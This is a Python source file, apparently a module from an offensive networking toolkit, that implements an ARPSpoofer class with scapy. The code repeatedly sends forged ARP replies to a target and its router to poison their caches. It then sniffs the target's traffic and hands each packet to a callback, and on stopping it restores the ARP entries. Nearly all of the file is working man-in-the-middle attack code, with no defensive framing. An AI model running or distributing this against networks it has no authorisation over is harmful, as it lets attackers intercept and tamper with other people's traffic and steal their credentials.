import os
from scapy.all import *
from ..utils import get_mac, get_router_ip
from time import sleep
import multiprocessing


class ARPSpoofer():
    def __init__(self, target_ip, interface="wlan0", router_ip=get_router_ip()):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.target_mac = get_mac(self.target_ip, interface)
        self.router_mac = get_mac(self.router_ip, interface)
        if not self.target_mac:
            raise Exception("Couldn't find target MAC")
        if not self.router_mac:
            raise Exception("Couldn't find router MAC")

    def arp_poison(self):
        try:
            while 1:
                print("Spoofing...")
                send(ARP(op=2, pdst=self.target_ip,
                        psrc=self.router_ip, hwdst=self.target_mac))
                send(ARP(op=2, pdst=self.router_ip,
                        psrc=self.target_ip, hwdst=self.router_mac))
                sleep(3)
        except KeyboardInterrupt:
            print("Stopping spoofing")

    def run(self, on_pckt_callback, verbose=True):
        multiprocessing.Process(target=self.arp_poison).start()
        try:
            sniff(filter='src %s' % (self.target_ip), 
                prn=lambda x: on_pckt_callback(x))
            sleep(1)
        except KeyboardInterrupt as e:
            if verbose:print("Quitting...")
        
        self.stop(verbose)

    def stop(self, verbose=True):
        if verbose:
            print("Restoring targets")
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)
        
